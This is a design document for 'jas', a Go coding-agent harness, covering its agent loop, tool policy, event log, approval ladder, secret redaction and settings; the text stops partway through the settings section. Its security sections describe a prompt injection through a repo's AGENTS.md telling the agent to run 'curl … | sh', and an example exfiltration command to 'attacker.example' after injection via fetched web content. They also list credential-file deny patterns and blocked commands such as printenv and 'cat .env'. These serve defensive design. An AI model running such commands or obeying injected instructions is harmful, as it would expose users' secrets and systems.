# jas — design

> A tiny, fast coding-agent harness in Go. "Hermes-lite, developer-first."

**Repo:** https://github.com/jasonli0226/jas
**Reference:** user-visible behavior (flags, keys, settings, exit codes, events) lives in [manual.md](manual.md); this document keeps the architecture, the contracts behind it, and the roadmap.
**Design review:** findings filed as [#1](https://github.com/jasonli0226/jas/issues/1)–[#13](https://github.com/jasonli0226/jas/issues/13); decisions below encode the accepted comments.
**Farm research (2026-11):** [research/farm-multi-agent-community-2026-11.md](research/farm-multi-agent-community-2026-11.md) — multi-agent coding evidence and community pain points.
**Specs:** farm — [design/2026-11-02-farm-design.md](design/2026-11-02-farm-design.md) (MVP and chat `/farm` shipped; post-MVP order in its MVP cut) · session awareness — [design/2026-11-02-session-awareness.md](design/2026-11-02-session-awareness.md) (session records and `jas sessions` shipped in #91; overlap warnings proposed) · spec-driven flow — [design/2026-11-02-spec-driven-flow.md](design/2026-11-02-spec-driven-flow.md) (proposed; `jas spec` interview, scaffold phase, section runs; farm plans from it). · memory & dreaming — §12.3 (memory store #188 and a reviewed `jas dream` shipped; not a farm prerequisite) · event log — [event-log.md](event-log.md) (v1 contract).

---

## 1. Why "jas" and why another agent?

The AI coding-agent market is drowning in "yet another CLI agent." The gap is not
intelligence — models are the brain — it's the **harness**: process/IO/session/status
plumbing. The pain points we've personally hit across Hermes, pi, Claude Code, Codex:

1. **Cold start / overhead** — agents are slow to start, spawn heavy runtimes
2. **No parallelism** — one task per session; you juggle terminal tabs
3. **No visibility** — you can't see what N running agents are doing at a glance
4. **Not composable** — tools/skills/MCP are bolted on, not pluggable

jas bets on: **small core, pluggable everything, visible by default.**
The model is the brain; jas is the nervous system.

**Owner usage (2026-11-03):** day-to-day jas is **inline chat for pair
programming**, **starting projects from instructions** (and later scenarios /
`jas spec` scaffold), and **studying an existing repo to draft a scenario**
(`jas bootstrap`, §8.3). The JSONL event log, exit codes, and `jas run --json`
are the CI-grade receipt that chat and one-shot share; farm is for big,
check-gated splits — not a claim that multi-agent always beats one agent.
Versus pi: different jobs (interactive product depth vs chat + scenarios on an
auditable harness); see §14 and [use-cases.md](use-cases.md).

## 2. Language choice: Go (decided)

Rust was considered. **The bottleneck is the LLM round-trip (~2s), not the
harness**, so Rust's perf edge is invisible while Go's velocity is real, and
goroutines + errgroup are exactly the N-parallel-agent model the farm needs.
Cold start (~5–10 ms) and a ~12 MB static binary are hygiene, not the pitch.

Prompt assembly is **cache-friendly** (see #5): stable prefix order is
`system → tools → early messages` so providers with prompt caching keep hitting
the same prefix. Anything that rewrites earlier messages breaks that prefix, so
tool-result elision (§3) runs in **chunks at a threshold**, not every turn. Cold start stays a hygiene metric (§7); the metrics that
actually measure the harness are cache-hit rate, turns/task, and tokens/task.

## 3. Architecture

One static Go binary (`CGO_ENABLED=0`). Packages:

| package | holds |
|---|---|
| `core/` | session, agent loop, tool execution policy, approval ladder and grants, deny floor, path policy, redaction, budget/elision, compaction, event log, exit codes, `check` runner |
| `providers/` | provider-neutral types, SSE reader, tool-call accumulator, the OpenAI chat-completions adapter, a fake for tests |
| `tools/` | `shell`, `read`/`write`/`edit`/`ls`, `grep`; `web_fetch` and `web_search` behind `web_tools=true` (§12.1) |
| `settings/` | layered config, profiles, named providers, `auth.json`, trust, compiled-in model catalog (§10) |
| `skills/` | Agent Skills discovery and the catalog the model sees |
| `sessions/` | per-repo live session records for `jas sessions` |
| `farm/` | planner, supervisor, board, integrator, manifest (farm spec) |
| `tui/` | the inline Bubble Tea chat (no alt-screen; AGENTS.md) |
| `cmd/jas/` | CLI entry, subcommands, onboarding, the embedded manual skill |

Not built yet: `scenario/` (§8), MCP client, general RPC mode (§5). `jas attach`
shipped over a farm-only Unix socket (`farm/attachsrv.go`).

### The six interfaces

README's "6 interfaces total" are these (everything else is data or a thin
adapter). See also #5.

| # | Interface | Role |
|---|---|---|
| 1 | `Provider` | `Stream(ctx, req) ←chan StreamEvent` — LLM round-trips |
| 2 | `Tool` | `Name / Schema / Call` — built-ins + MCP wrappers |
| 3 | `EventLog` | append-only versioned JSONL writer (audit + resume + future RPC) |
| 4 | `ExecPolicy` | project root, timeout, env allowlist, path confinement, deny patterns |
| 5 | `Approver` | `--approve=never\|shell\|mutating` gate before tool exec |
| 6 | `UI` | print / JSONL-stdout / inline chat; attach later |

Provider-neutral types live in `providers/types.go`: `Message`, `ContentBlock`
(text / tool_use / tool_result), `StreamEvent`, `Usage`. The OpenAI
chat-completions + SSE adapter is the only backend; Anthropic-style deltas
are handled inside that adapter (or a later one), never leaked into the loop.
The provider layer retries 429/5xx with exponential backoff and enforces an
SSE idle timeout (no bytes for N seconds → cancel the stream).

### The agent loop (core)

```go
for turn := 0; turn < maxTurns; turn++ {      // JAS_MAX_TURNS, default 50
    if budget.WouldExceed(messages) {         // last usage.prompt_tokens + estimate
        return errContextFull                 // for messages added since; exit 3
    }
    stream := provider.Stream(ctx, messages)  // SSE; retry/backoff inside provider
    acc := newAccumulator()                   // tool calls arrive as *deltas*
    for ev := range stream {                  // single pass: print text AND reassemble
        if ev.Text != "" { ui.Print(ev) }
        acc.Add(ev)
    }
    msg, tc := acc.Done()
    messages.Append(msg)
    if len(tc) == 0 { break }                 // no tool calls → final answer
    results := exec.Run(ctx, tc)              // see Tool execution policy below
    // errors are RESULTS, not failures — the model sees the error and retries
    messages.Append(results...)
    budget.MaybeElide(messages)               // only past the threshold, in one chunk
    // ctx cancel (Ctrl-C): abort stream, synthesize cancelled tool results, flush log
}
// loop exits on turn cap → errTurnCap (exit 4)
```

### Tool execution policy

Each tool declares whether it is read-only (`read`, `ls`, `grep`) or mutating
(`write`, `edit`, `shell`). MCP tools default to **mutating** unless the MCP
descriptor sets `readOnlyHint` (safe default: external tools are untrusted).
See #3.

Execution batches by consecutive kind:

1. Walk the model's `tool_calls` in order.
2. A run of consecutive read-only calls executes **in parallel** (errgroup).
3. Each mutating call is a **barrier**: wait for the prior batch, run the
   mutator alone, then continue. `[read A, edit A, read A]` therefore observes
   A before and after the edit — never both reads racing the edit.
4. Results are always returned in `tool_call` order, regardless of completion
   order.

Every tool result is capped (`JAS_MAX_TOOL_OUTPUT`, default 32KB): longer
output is truncated with a `[truncated: N more lines]` marker. On top of that,
v1 tracks prompt tokens against the model's context window (see #2):

- **Window size** comes from a compiled-in model catalog (pi keeps the same
  data in `models-store.json`), overridable per model with the
  `context_window` config key (§10). Unknown model, no override → assume
  128k and log a warning.
- **Token count** = the last response's `usage.prompt_tokens` plus a
  `len(bytes)/4` estimate for every message appended since. That covers the
  first request and the turn right after a large tool result, where no usage
  number exists yet. Until the first usage number (and again after a
  compaction), the estimate also adds `len(bytes)/4` of the system prompt and
  tool schemas, which the messages don't contain. Compaction's kept tail
  leaves room for that overhead under the trigger.
- **Elision is chunked to protect the prompt cache** (§2). Nothing is rewritten
  until the count crosses `elide_at` (default 60% of the window). Then, in one
  pass, every tool result except the last K becomes
  `[elided: read foo.go 412 lines]`. The prefix changes once per pass, not once
  per turn, so cache hits resume on the next request.
- A provider `context_length_exceeded`, or a count still over the window
  after elision, becomes a clean stop (exit 3) in `jas run`. The chat
  compacts first (pi's `window − reserve` threshold, plus an overflow retry).

### Event log & resume

Every step appends a versioned JSONL event to `<session>/events.jsonl` — the
audit log, the source for resume, and the future RPC wire format. Record
shape (see #6):

```json
{"v":1,"id":"…","parent_id":"…","seq":42,"ts":"…","type":"tool_started", …}
```

`parent_id` is the previous event's id, forming a linear chain. `seq` and `id`
continue across reopen (resuming from the last event). The session file is
locked while open (write-ahead & replay safety).

**Event types (contract).** The full contract — every field, reader and
writer rules, ordering, and the resume rules — is
[event-log.md](event-log.md); it wins where this summary differs. `--json`
consumers and the future RPC protocol depend on this list. Adding a type or field is backward compatible. Renaming or
removing one bumps `v`. Replay refuses a file with an event whose `v` is
newer than it reads, rather than misread it.

| type | payload | when |
|---|---|---|
| `session_started` | model, provider (resolved name), base_url, approve level, project root, context files loaded, skills listed (name, scope, location) | once per file, first |
| `session_resumed` | model, provider (resolved name), base_url, approve level, project root, context files loaded, skills listed (name, scope, location) | once per reopen, after replay |
| `user_message` | content (wire blocks), steer (optional bool) | when user sends a message or steering text |
| `turn_started` | (empty) | at start of each user message, including a steer delivered after the final answer |
| `assistant_message` | text, content (wire blocks), final (bool) | after each stream; final on the answer turn; a `tool_use` block whose arguments aren't valid JSON stores them as the string `input_raw` instead of `input` |
| `usage` | prompt_tokens, completion_tokens, cached_tokens | after each provider response |
| `tool_started` | tool, call_id, args, mutating | before exec (fsynced first if mutating) |
| `approval` | call_id, tool, decision (granted\|denied\|unavailable) | when the user is asked (or no one can be); not for ungated or standing-grant calls |
| `tool_result` | call_id, tool, status (ok\|error\|denied\|cancelled\|interrupted\|not_run), output; optional `diff` after an ok `write` (`path`, `hunks` of `{k,o,n,t,s}`, `truncated`; a `write` over an existing file logs added lines only; an `edit` logs no `diff`: its full diff, like a write's, is screen-only); replay ignores `diff` | after exec |
| `elided` | count, tokens_before, tokens_after | each elision pass |
| `turn_ended` | status, exit_code, reason, turns, prompt_tokens, completion_tokens | at end of each user message; `turns` counts the model requests within it |
| `model_changed` | model (bare id), provider, base_url (the session's endpoint; never a key) | when SetModel is called; replay and resume take provider and base_url from the latest of these three events that carries them |
| `profile_changed` | from, to, context_files, skills, deferred (settings keys waiting for `/new`) | when the chat switches profile; logged from a `tea.Cmd`. Replay and resume take the session's last profile from the latest `session_started` / `session_resumed` `profile` or `profile_changed` `to` |
| `session_titled` | title (one line, ≤80 runes; "" clears) | when SetTitle is called (`/name`, `jas --name`); the latest wins. `session_started` may also carry `title` (`jas run --name`) |
| `compaction` | summary, first_kept_id, tokens_before, tokens_after, usage | when history is compacted (chat only) |
| `shell_ran` | command, output, exit_code, error, cancelled, truncated, local (redacted) | when the owner's `!` / `!!` command finishes (chat only); replay returns `!` entries after the last `user_message` as pending, so a resumed session's next message carries them; `local` (`!!`) entries never reach the model |
| `session_ended` | status, exit_code, turns, prompt_tokens, completion_tokens | once each time closed; totals cover the current open only; absent after a crash |

`context_reloaded`, `injected`, `budget_stop` and `check_ran` are listed in
the manual's Event log table.

**Single writer:** all appends go through one `EventLog` goroutine;
concurrent callers send events. The writer fsyncs after each turn's tool
results — and, for mutating calls, fsyncs `tool_started` **before** the call
executes (write-ahead; see #4).

**Side effects and resume (contract):**

1. Mutating call → fsync `tool_started` → execute → `tool_result`.
2. On resume, a `tool_started` with no matching `tool_result` is **never**
   re-executed. Replay answers it with an error result reading "interrupted:
   jas stopped while this call was running; it may have partly run. Inspect the
   current state before retrying.", and `ResumeSession` appends a `tool_result`
   with status `interrupted` and that text right after `session_resumed`, so
   later replays find a real result. A `tool_use` with no `tool_started` never
   ran: replay answers it with "not run: jas stopped before this call started;
   it had no effect." and `ResumeSession` logs status `not_run`. This is an
   **at-most-once** guarantee, not
   atomicity. A crash during a shell command can leave its side effects half
   done. The result says so, and the model decides what to do next.
3. `write`/`edit` are atomic on their own: write a temp file in the same
   directory, fsync, then `rename`. A crash leaves the old file or the new
   one, never a torn mix.
4. Ctrl-C mid-turn synthesizes `cancelled` tool results for any dangling
   `tool_calls` so the next chat-completions request is well-formed (no 400).
5. Shell children run with `Setpgid: true`; cancel kills the process group and
   uses `WaitDelay` so grandchildren cannot outlive the tool call.

### 3.1 Shell security stance

**pi-style YOLO, documented loudly** (see #1). Path confinement and the deny
floor apply to the *file* tools. The `shell` tool inherits an allowlisted env
(`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus scenario additions)
and can still reach anything `HOME` can — `cat ~/.aws/credentials`,
`python -c`, `curl`. In-process string guards on the command line are theater
and are **not** claimed as a security boundary.

- CLI: `--approve=never|shell|mutating` (default `never` = permissive).
  The tool-exec path always consults the Approver so the gate is real even
  when it defaults open. It is a ladder, each level gating a superset of the
  one before:

  | level | prompts before |
  |---|---|
  | `never` | nothing |
  | `shell` | every `shell` call |
  | `mutating` | every mutating call: `shell`, `write`, `edit`, MCP tools without `readOnlyHint` |

  The default can be persisted with `jas config set approve <level>` (§10).
- **Denial** (interactive): the call gets a `tool_result` with
  `status: denied` and the run continues. The model sees the denial and
  picks another route. It is a result, not a failure.
- **No TTY** (CI, `--json` piped, stdin not a terminal): a gated call cannot be
  answered. jas records `approval: unavailable` and stops with exit 5, so a CI
  job that asked for a gate fails loudly instead of hanging or silently
  proceeding. CI that wants unattended runs uses `--approve=never` inside a
  container.
- If you care about isolation: run jas (or each farm part) inside
  **bubblewrap/Docker**. That is the documented answer today and the planned
  per-task option in v3 — not a pretend in-process sandbox.

### Exit codes (contract)

Tool errors are results the model sees (loop above), so they never set the
exit code by themselves. The process exit code reflects how the *run* ended
and is repeated in `session_ended`, with a `reason` on every non-zero exit.
The table (0–8, 130) is in the manual's Exit codes section; `TestManual_*`
keeps it complete.

### The Tool interface (the whole extensibility story)

```go
type Tool interface {
    Name() string
    Schema() json.RawMessage   // JSON-schema for the model
    Call(ctx, args json.RawMessage) (Result, error)   // ctx carries timeout + sandbox
}
```

- Built-ins implement it directly.
- MCP servers (v2) are loaded at startup and wrapped into the same interface;
  default to mutating unless `readOnlyHint` is set (Tool execution policy above).
- **Edit format:** the `edit` tool takes `{path, old_string, new_string}`.
  `old_string` must match exactly once in the file (otherwise the call returns an
  error asking for more context). This is the same exact-match format pi and
  Claude Code use; it is more reliable with current models than unified diffs.
  `write`/`edit` refuse content containing a `[REDACTED:` marker (§9) with an
  explicit **"region contains redacted content"** error (not a silent no-match
  loop — see #7). Per-path opt-out covers fixture/docs paths that legitimately
  hold example keys.
- **Path confinement:** file tools resolve paths with `filepath.EvalSymlinks`
  and refuse anything outside the project root before the deny-list check runs.
  (Does not confine `shell` — see §3.1 / #1.) **Project root** = `git rev-parse
  --show-toplevel` from cwd, else cwd. For a farm part it is that part's
  worktree. The root travels in `ExecPolicy`. jas never calls `os.Chdir`,
  because farm parts share one process (§5), and shell children get the root
  as their `Dir`.
- **Shell environment:** `shell` runs children with an allowlisted environment
  (`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus names the scenario
  adds), never jas's own environment. `JAS_API_KEY` and other provider keys
  are never visible to tools.
- **Project instructions:** load `AGENTS.md` (and `CLAUDE.md` as a
  fallback) from the project root into the system prompt (#8). Complements, does not replace, `scenario.yaml` runtime policy (#9).
  These files come from the repo, so they are a prompt-injection channel. With
  the default `--approve=never`, "run `curl … | sh`" in a cloned repo's
  `AGENTS.md` would just execute. jas therefore has a **project trust gate**
  for context files (pi gates project-local files the same way): the first time
  jas sees context files in a project, it asks `trust this project?
  [y/N/always]`. The answer is cached in `~/.jas/trust.json`, keyed by root
  path plus content hash, so an edit asks again. Without a TTY, untrusted
  context files are **skipped with a warning** unless `--trust-project` is
  passed. Scenarios will extend the same gate (§11).
- **Skills (shipped after v1):** a skill = `SKILL.md` per the agentskills.io
  spec, discovered in the project's `.agents/skills` and `.claude/skills`, then
  the active profile's `~/.jas/profiles/<name>/skills` and the built-in manual
  (§10 config layers), listed in the system prompt (pi's `<available_skills>` block) and
  loaded on demand with the `read` tool, which may open every skill's
  directory (`ExecPolicy.ReadRoots`). Project skills share the context
  file's trust prompt. Optional tool manifests stay v3. Research:
  `docs/research/agent-skills.md`.

## 4. v1 (shipped)

The weekend-one goal — a single binary that beats `pi --print` on cold start
and runs a real coding task end to end — shipped in 2026-10, together with
skills, the inline chat and project-scoped settings, which were first
planned for later. Its contracts are §3 (event log, exit codes, approval
ladder, side-effect rules) and §9 (secret layers 1, 2 and 4). Shell isolation
is still bubblewrap/Docker; per-task containers are v3.

## 5. v2 roadmap

v2 is no longer a single weekend. Work proceeds on three tracks. Farm stays
last on its own track; memory is not a farm prerequisite.

**Already in place — do not redo.** The audit event log already lives globally
at `~/.jas/sessions/<id>/events.jsonl`. `<project>/.jas/sessions/` is only for
the proposed session-awareness heartbeats, not a second copy of the log, and
the log should not be moved. `AGENTS.md` is the handbook, skills are stable
workflows, compaction is in-session context only, and named profiles already
isolate user-level instructions and skills.

**Track A — receipt contract and farm prerequisites** (the product-bet order
after TUI dogfood):

1. Publish the event-log spec (the §3 schema as a versioned contract). Farm,
   RPC, and dreaming all consume it. Published:
   [event-log.md](event-log.md).
2. Provider fidelity.
3. Run token and wall-clock caps for `jas run` (exit 7; checked before each
   request). Shipped (#91).
4. Opt-in sandbox.
5. Benchmarks with n>1.
6. `jas farm plan` / `jas farm run`, then the reviewer part, then `jas attach`,
   then interactive `/farm`. Plan/run (#95), interactive `/farm` (#116) and
   `jas attach` (watch #226, control #228) shipped.

**Track B — core loop, can ship before farm and overlap A:**

- Session awareness (item below). Prefer this before or with the memory store
  so overlapping sessions also warn on writes in the memory dir.
- Spec-driven flow (`jas spec`). Farm can later plan from an approved spec.

**Track C — memory, after the event-log spec is stable:**

1. Memory store (layers 2–4): one store on the active profile,
   `~/.jas/profiles/<name>/memory/`, with a `projects/<key>/` folder for notes
   that apply to one project. Nothing lives in the repo. `MEMORY.md` is a short
   index loaded at session start with a hard cap (match Claude Code: first
   200 lines or 25 KB). Topic notes are read on demand and may link to each
   other. In-session writes are lifted only inside those dirs (same symlink
   and overlap guards, and the same write prompt, as the active profile's
   `skills/` — #173). Store durable
   lessons, not repo state the next session can see by reading the tree.
   `AGENTS.md` and skills stay owner-edited. Details: §12.3.
2. `jas dream` (shipped):
   a reviewed command, not a background daemon and not a wrapper
   around Anthropic's managed-agents Dreams API. It reads recent event logs
   plus the current memory store, writes a *proposed* cleanup (a new store or
   a diff; default is not an in-place rewrite), and waits for owner approval.
   The run is logged. It may flag notes that look ready to become a skill or
   an `AGENTS.md` rule; it does not edit those files. A later scheduled run,
   if added, only prepares the proposal.
3. Promotion (v3, with `jas learn`): owner-approved graduation of a verified
   note into a skill or `AGENTS.md`.

**Shipped from this list:** `jas farm plan` / `jas farm run` (#95; spec
[design/2026-11-02-farm-design.md](design/2026-11-02-farm-design.md),
for tasks too big for one agent, not "better than one agent" —
[research](research/farm-multi-agent-community-2026-11.md)); `/farm` in the
chat (#116); auto-compaction; layered settings and `/settings` (§10);
resume (`jas --continue`, `/resume`); `web_fetch` / `web_search` (§12.1;
`git_clone` deferred); steering and follow-up queues. Behavior: the manual.

- [ ] **Spec-driven flow** (proposed; core loop, works without farm) —
      `jas spec` grill-me interview → approved spec (hash in the event log);
      `jas spec --check` / `jas run --spec` fail headless with open questions
      (exit 2); bounded `--phase scaffold`; single-agent `--section` runs that
      cite acceptance criteria. Spec:
      [design/2026-11-02-spec-driven-flow.md](design/2026-11-02-spec-driven-flow.md)
- [ ] **Session awareness** (core loop, not farm) — records in
      `<repo>/.jas/sessions/` (title, branch, touched files, heartbeat) and
      `jas sessions` shipped (#91). Still proposed: the read-only peers note
      and tool, and warn/ask before writing a file another active session
      touched. Spec:
      [design/2026-11-02-session-awareness.md](design/2026-11-02-session-awareness.md)
- [x] **Memory store** (shipped in #188; Track C.1) —
      `~/.jas/profiles/<name>/memory/` (per-project notes in
      `projects/<key>/`, never in the repo); capped `MEMORY.md` index plus
      on-demand topic notes; write lift only there. Behavior: `docs/manual.md`
      (Memory).
- [x] **`jas dream`** (shipped, this branch; Track C.2) — read
      recent event logs and the current store, write a proposed cleanup for
      owner approval, log the run, do not edit `AGENTS.md` or skills. §12.3.
      Behavior: `docs/manual.md` (`jas dream`).
- [ ] Farm `reviewer` part (replaces the earlier discussion mode): an
      optional read-only part with a clean context, possibly a different
      model, reviewing the integrated diff; after farm
- [x] **`jas attach [<farm-id> [<part>]]`** (shipped: watch #226, control #228)
      — connects to the farm's Unix socket (`~/.jas/run/<farm-id>.sock`, 0600)
      over a JSONL protocol: watch the dashboard and a part's output; steer,
      pause, resume, drop, stop; answer approvals. The `jas resume` fallback
      for a dead supervisor was dropped (crash-resume is the separate
      `farm resume` item). Spec:
      [design/2026-11-22-jas-attach-design.md](design/2026-11-22-jas-attach-design.md).
- [ ] MCP client support (stdio first, then HTTP)
- [ ] **Session tree**: `parent_id` already on events from v1 → branches, fork,
      clone (branch summaries reuse compaction)
- [ ] **RPC mode**: the §3 event types plus a command set, as JSONL. Two
      transports: stdio (`jas serve`, for a parent process such as an IDE or
      the Telegram bot) and a Unix socket (the farm supervisor's attach socket
      exists; generalizing it is open)
- [ ] **Scenarios** (§8), with the project trust gate (§3) extended to
      scenario files and hook scripts (§11)
- [ ] **Blind secret access** (§9 layer 3)
- [ ] **Evals**: fixed-task eval harness with fixtures — with/without scenario
      lift reports (pi's vitest-evals idea, simplified)

## 6. v3 ideas

- skill tool manifests — Hermes-style. Instruction-only `SKILL.md` skills
  (agentskills.io spec) already shipped (§3)
- optional `.mcp.json` interop alongside `scenario.yaml`'s `mcp:` block
  (scenario.yaml remains the single runtime-policy format — #9)
- **`jas learn <topic>`**: research → draft → human approval → save a skill (§12.2); also the promotion path for a verified memory note into a skill or an `AGENTS.md` draft (§12.3)
- codemode: model-written JS in a **goja** (pure-Go JS) sandbox, tools as the
  only capability (absorbs backlog #14 mini-codemode)
- virtual models: routing model that dispatches each request to a physical
  model (`jas/auto:low → cheap-model`) (absorbs backlog #3)
- git-installable scenario/skill packages (`jas scenario install git:…`)
- containerized farm tasks (bubblewrap/Docker) — same isolation answer
  documented for v1 (#1), now a first-class per-task option
- tool-trace replay & cost simulator (absorbs backlog #11)
- Jev-classifier tool-risk gate (absorbs #5)
- OTel export of sessions (telemetry)

## 7. Benchmarks

Cold start stays a **hygiene** metric (guards accidental dependency bloat —
essentially free via `go build`). Primary metrics measure whether the harness
(prompt construction, tool policy, output caps, elision) is efficient — which
is jas's thesis. See #13. Results: [benchmarks.md](benchmarks.md).

| kind | metric | target |
|---|---|---|
| hygiene | cold start | < 50ms (`jas --version`; `jas run` up to the first HTTP request sent) |
| hygiene | binary size | < 15MB static |
| primary | cache-hit rate | report vs pi on the same model/provider (stable prompt prefix §2) |
| primary | turns / task | 3 fixed tasks: fewer is better; "add a header comment to main.go" ≤ 3 turns |
| primary | tokens / task | same 3 fixed tasks: total prompt+completion tokens reported vs pi |
| secondary | wall-clock / TTFT | reported alongside, not optimized for |

## 8. Scenarios: declarative runtime policy (v2)

A scenario = a preset bundle of (system prompt + toolset + sandbox policy + hooks).
**Scenarios are data, never hard-coded.** `.jas/scenario.yaml` in a repo governs
how jas operates there — the **single runtime-policy format** (deny patterns,
sandbox, toolsets, hooks, mcp). See #9.

- **AGENTS.md** (adopted in v1, #8) complements scenario.yaml: project
  instructions for the model. It cannot express runtime policy.
- **SKILL.md** skills shipped (§3) and **`.mcp.json`** stays on the v3 roadmap
  for interop; neither replaces `scenario.yaml`.
- **Blueprints** (scaffold-from-preset / `jas new` / `jas scenario save`) are
  **dropped** — they don't advance the agent loop. `jas bootstrap` (below)
  still drafts a scenario from an existing project.

### 8.1 Discovery & precedence (most specific wins, layer-merge)

Scenario **policy** discovery (separate from prefs in §10):

```
CLI flag            jas run --scenario <name|path>  explicit, wins (name → ~/.jas/scenarios/<name>/ or built-in)
└── project         .jas/scenario.yaml              tools/hooks/sandbox/MCP only — not prefs
    └── global      ~/.jas/scenarios/<name>/
        └── built-in scenarios/ (Go-compiled)       2-3 starter presets
```

Plain prefs (`model`, `approve`, …) use the Claude 3-way config files in §10
(`config.local.json` / project `config.json` / `~/.jas/config.json`), not
`scenario.yaml`.

### 8.2 Scenario file (declarative YAML, checked into the repo)

```yaml
# .jas/scenario.yaml
name: my-ml-project
system: |
  You work on an ML research repo. Experiments live in experiments/;
  never touch data/ directly; log every run to results.jsonl.
tools:
  core: [shell, files, grep]
  python: {exec: uv, venv: .venv}
sandbox:
  deny: ["data/**:write", ".git/**:write", ".env*", "secrets/**", "**/.env"]
hooks:
  post_run:    [{script: .jas/hooks/summarize-metrics.sh}]
  pre_apply:   [{script: .jas/hooks/lint.sh}]   # before file-mutation applied (#10)
mcp:
  - {command: uvx, args: [mcp-server-git]}
```

`pre_apply` runs before any file-mutation tool result is applied to disk
(renamed from the earlier `pre_commit`). See #10. **Commit rule:** jas never
commits to a branch it did not create. The only commits jas makes are farm
commits on its own `jas/farm/<farm-id>/*` branches, with a stated identity
and `Jas-Farm:` / `Jas-Part:` trailers; the owner's branch changes only when
the owner picks *merge* (farm spec, Commits).

### 8.3 `jas bootstrap` — scenario from an existing project (no LLM)

Deterministic heuristics, instant and repeatable. Writes a draft
`.jas/scenario.yaml` the user hand-edits:

| Signal | Generated |
|---|---|
| `pyproject.toml`/`requirements.txt` | python toolset (uv), venv path, pytest hook |
| `package.json` | node toolset, npm script shortcuts, jest/vitest hook |
| `go.mod` | go toolset, `go test ./...` pre_apply hook |
| `Makefile` targets | named tool shortcuts (`make train` → tool `train`) |
| `experiments/` + `results.jsonl` / MLflow/W&B config | ML guardrails (data/ deny, run logging) |
| `next.config.*`/`vite.config.*` | web-app preset: dev-server + screenshot tools |
| `AGENTS.md`/`CLAUDE.md` | noted; already loaded in v1 — bootstrap may mirror into `system` |
| `.env` present | listed as required env + added to sandbox deny (never read) |
| `.mcp.json`/Hermes config | converted into the `mcp:` block |

What stays compiled-in: only tool *implementations* and the loader/merger.
Scenarios are 100% data.

## 9. Secrets & sensitive data (layers 1, 2, 4 shipped; layer 3 blind secret access = v2)

**Principle: the agent never sees secret *values* — not in tool output, not in
the transcript, not in the event log.** How peers do it, and what jas adopts:

| Approach | Who uses it | jas |
|---|---|---|
| Env passthrough (agent process gets keys) | many naive agents | ❌ root of all leaks |
| Deny-list file reads | Claude Code (`.env` in default ignores) | ✅ baseline |
| Redaction middleware on tool output | pi, modern harnesses | ✅ output scrubber |
| Secret proxy (harness holds keys, agent requests "use key X" blind) | OpenAI Codex cloud, pi | ✅ v2 |
| Env scrubbing for tool subprocesses | Codex, pi | ✅ shell gets an allowlisted env (§3) |
| Isolated sandbox FS (no dotfiles mounted) | cloud agents | 🔜 documented answer = bubblewrap/Docker (#1); first-class per-task containers in v3. Git worktrees are *not* isolation — they share the user's FS and home dir |

Concretely, four layers (defense in depth — any one failing must not leak):

1. **File deny-list.** A **hard floor** is compiled into the binary:
   `.env*`, `**/.env`, `secrets/**`, `*.pem`, `id_rsa*`, `*.p12`,
   `.git-credentials`, `~/.aws/**`, `~/.ssh/**`, `~/.jas/**` (plus `$JAS_HOME`
   when set; reads, and writes after a prompt that no level or grant skips,
   are let through under the active profile's `skills/` only). From v2,
   scenarios can add
   patterns via `sandbox.deny`; `deny` is additive and the floor cannot be
   lifted. Patterns are matched against the symlink-resolved path (§3).
2. **Output redaction** (core middleware, runs on every tool result before it
   enters the model transcript or event log). Three rules, in order of
   confidence:
   - **Exact values** jas knows are secret: `JAS_API_KEY`, every key in
     `auth.json` (v2), every declared scenario secret (v2). Cheapest and strongest.
   - **Known token shapes:** `sk-…`, `ghp_…`, `AKIA…`, `Bearer …`, JWTs,
     `-----BEGIN … PRIVATE KEY-----`.
   - **High-entropy values only in an assignment context** (`KEY=value`,
     `"key": "value"`, `key: value` where the key name looks secret-ish).
     Bare high-entropy strings and long base64 are *not* redacted: that would
     hit `go.sum` hashes, lockfiles and test fixtures, and the model would then
     write `[REDACTED:…]` back into source files.

   Matches are replaced with `[REDACTED:<kind>]`. `write`/`edit` refuse content
   containing that marker with an explicit **"region contains redacted
   content"** error (§3 / #7) so the model doesn't loop on a silent no-match.
   Per-path opt-out (fixture/docs paths) is the escape hatch for legitimate
   example keys. The scrubber is tested against a fixture corpus that includes
   false-positive cases (`go.sum`, `package-lock.json`, UUIDs) **and** against
   a sample of real repos — `go.sum` alone is a worst-case corpus, not a
   representative FP rate (#7).
3. **Blind secret access (v2):** scenario can declare secrets with a scope:
   ```yaml
   secrets:
     - {name: OPENROUTER_KEY, tools: [web_fetch], hosts: [openrouter.ai]}
   ```
   jas loads them from the environment into its own memory; tools reference
   them as `{{secret:NAME}}` placeholders resolved at execution time *inside*
   jas — the value never round-trips through the model. A placeholder is only
   resolved for the listed tools and, for network tools, only for requests to
   the listed hosts; `shell` never resolves placeholders. This blocks
   `curl attacker.example?k={{secret:X}}` exfiltration after a prompt
   injection (e.g. from `web_fetch` content). Exact-value redaction (layer 2)
   catches any value that is echoed back anyway.
4. **Session hygiene:** `events.jsonl` and the model transcript pass through the
   same redaction gate, so crash-resume replays only already-redacted events.

Also denied at the **shell** layer as a best-effort filter: `env`, `printenv`,
`cat .env*` style commands are matched against the same deny semantics (the
shell tool inspects the command string for deny-pattern hits before exec).
**Not a security boundary** — §3.1 / #1. Layer 2 (output redaction) is the
backstop; containers are the isolation answer.

**Acceptance test (CI):** a fixture repo (no scenario) with a `.env` present,
and `JAS_API_KEY` set; agent is asked "print the config" and "print your
environment"; transcript and `events.jsonl` must contain zero secret values
(CI assertion).

## 10. Settings & storage (Claude-style layers + `~/.jas/`)

jas needs a persistent home. Env vars alone can't express saved keys,
per-model overrides, or defaults you set once and forget. Modeled on pi's agent
dir (verified against a local `~/.pi/agent/` install): one settings dir, keys
kept apart from config, and **everything configurable from the CLI and
stored**. pi writes `defaultProvider`/`defaultModel` to `settings.json` when
you pick a model and saves keys to `auth.json` on `/login`. Env vars are only a
fallback there. jas does the same with plain subcommands and chat `/settings`.

```
~/.jas/                        # agent dir (global-only for auth/trust/sessions)
├── config.json                # global prefs: model/provider/base_url, approve, UI, …
├── farm.yaml                  # user farm config
├── auth.json                  # saved API keys (chmod 0600; global-only forever)
├── trust.json                 # project trust answers (global-only forever)
├── scenarios/                 # saved scenario presets (not blueprints — #9)
├── sessions/                  # session dirs: <session>/events.jsonl (§3) — already global
├── profiles/<name>/memory/    # MEMORY.md index + topic notes (§12.3)
├── farms/                     # farm state (farm spec)
├── run/                       # farm supervisor sockets for attach
└── AGENTS.md                  # global instructions appended to every system prompt

<project>/.jas/
├── config.json                # shared team prefs (commit) — Claude-style project settings
